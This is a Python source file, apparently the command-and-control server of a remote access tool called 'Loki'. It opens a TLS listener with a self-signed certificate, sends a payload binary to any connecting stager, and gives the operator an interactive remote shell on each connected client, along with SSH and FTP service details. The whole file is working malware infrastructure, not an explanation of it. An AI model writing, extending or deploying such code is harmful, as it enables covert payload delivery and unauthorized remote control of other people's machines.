# Date: 06/01/2018
# Author: Pure-L0G1C
# Description: Server

import ssl
import socket
from os import path
from lib import const
from time import sleep
from queue import Queue
from OpenSSL import crypto
from random import SystemRandom
from threading import Thread, RLock
from .lib import session, shell, interface


class Server(object):
    def __init__(self):
        self.interface = interface.Interface()
        self.waiting_conn = Queue()
        self.is_active = False  # is the server active
        self.lock = RLock()
        self.server = None
        self.port = None
        self.ip = None

        self.is_processing = False

    def gen_cert(self):
        key_pair = crypto.PKey()
        key_pair.generate_key(crypto.TYPE_RSA, 2048)

        cert = crypto.X509()
        cert.get_subject().O = "Loki"
        cert.get_subject().CN = "Sami"
        cert.get_subject().OU = "Pure-L0G1C"
        cert.get_subject().C = "US"
        cert.get_subject().L = "Los Santos"
        cert.get_subject().ST = "California"

        cert.set_serial_number(SystemRandom().randint(2048**8, 4096**8))
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(256 * 409600)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(key_pair)
        cert.sign(key_pair, "sha256")

        with open(const.CERT_FILE, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))

        with open(const.KEY_FILE, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key_pair))

    def server_start(self):
        if self.is_processing:
            return

        self.is_processing = True

        self.gen_cert()
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(const.CERT_FILE, const.KEY_FILE)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            sock.bind((self.ip, self.port))
            self.is_active = True
            sock.settimeout(0.5)
            sock.listen(100)

            self.server = context.wrap_socket(sock, server_side=True)
            self.services_start()
        except OSError:
            self.display_text("Error: invalid IP")
            self.port = None
            self.ip = None
        finally:
            self.is_processing = False

    def server_stop(self):
        if self.is_processing:
            return

        self.is_processing = True

        if not self.is_active:
            self.is_processing = False
            return

        self.is_active = False
        self.interface.close()

        self.is_processing = False
        self.ip, self.port = None, None

    def manage_conn_info(self, sess_obj, conn_info):
        if conn_info:
            try:
                with self.lock:
                    services = {
                        "ssh": {"ip": const.PUBLIC_IP, "port": const.SSH_PORT},
                        "ftp": {"ip": const.PUBLIC_IP, "port": const.FTP_PORT},
                    }

                    sess_obj.send(args=services)
                    self.manage_conn(sess_obj, conn_info)
            except:
                pass

    def manage_conn(self, sess_obj, conn_info):
        _shell = shell.Shell(sess_obj, self.interface)
        shell_thread = Thread(target=_shell.start)
        self.interface.connect_client(sess_obj, conn_info, _shell)
        shell_thread.daemon = True
        shell_thread.start()

    def send_payload(self, sess):
        """Send payload to stager"""

        if not path.exists(const.PAYLOAD_PATH):
            print("Payload binary does not exist; please generate it")
            return

        with open(const.PAYLOAD_PATH, "rb") as f:
            while True:
                data = f.read(const.BLOCK_SIZE)

                if data:
                    sess.sendall(data)
                else:
                    break

    def examine_conn(self, s, conn_info):

        if type(conn_info) != dict:
            print("Client did not supply a proper data type")
            return

        if not "code" in conn_info or not "args" in conn_info:
            print("Client did not supply both code and args")
            return

        if conn_info["code"] == None:
            print("Client supplied no code")
            return

        if conn_info["code"] == const.STAGER_CODE:
            self.send_payload(s.session)
            return

        if conn_info["code"] == const.CONN_CODE:
            print("Establishing a secure connection ...")
            self.manage_conn_info(s, conn_info)

    def establish_conn(self, sess, ip):
        s = session.Session(sess, ip)
        conn_info = s.initial_communication()

        if conn_info:
            self.examine_conn(s, conn_info)

    def waiting_conn_manager(self):
        while self.is_active:
            if self.waiting_conn.qsize():
                session, ip = self.waiting_conn.get()
                sleep(0.5)
                self.establish_conn(session, ip)

    def server_loop(self):
        while self.is_active:
            try:
                session, ip = self.server.accept()
                self.waiting_conn.put([session, ip])
            except:
                pass

    def services_start(self):
        server_loop = Thread(target=self.server_loop)
        conn_manager = Thread(target=self.waiting_conn_manager)

        server_loop.daemon = True
        conn_manager.daemon = True

        server_loop.start()
        conn_manager.start()

        print("Server started successfully")

    # -------- UI -------- #

    def display_text(self, text):
        print("{0}{1}{0}".format("\n\n\t", text))

    def start(self, ip, port):
        if self.is_active:
            self.server_stop()
        self.ip, self.port = ip, int(port)
        self.server_start()
        sleep(1.2)
        return self.is_active

    def stop(self):
        if self.is_active:
            self.server_stop()
            sleep(1.2)
        return self.is_active
